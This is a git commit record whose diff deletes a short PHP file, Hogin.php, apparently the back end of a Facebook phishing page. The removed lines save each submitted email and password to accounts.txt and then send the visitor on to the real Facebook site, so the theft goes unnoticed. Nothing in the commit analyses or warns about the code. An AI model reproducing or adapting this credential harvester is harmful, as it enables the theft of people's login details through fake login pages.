7fdf384ae6c5f2667dcb3ccace603e5ffda31e2b
M7mud3issa <87418358+M7mud3issa@users.noreply.github.com>
2021-07-21 15:42:21 +0200

    Delete Hogin.php

--- Hogin.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-file_put_contents("accounts.txt", "" . $_POST['email'] . ":" . $_POST['pass'] . "\n", FILE_APPEND);
-echo ("<script>window.open('https://www.facebook.com/','_self');</script>");
-
-
-?>
